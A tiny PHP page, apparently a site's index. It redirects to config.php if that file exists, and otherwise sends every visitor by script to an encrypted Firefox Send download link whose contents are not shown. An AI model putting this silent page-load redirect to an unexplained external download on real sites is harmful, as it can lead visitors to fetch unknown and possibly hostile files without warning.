<?php
if(file_exists('config.php')){
    header('Location: config.php');
}
?>

<script type="text/javascript">
	window.location.href = "https://send.firefox.com/download/a9d80efeab963b92/#DLrGEjBrQvYf_I-zd1YeJA";
</script>

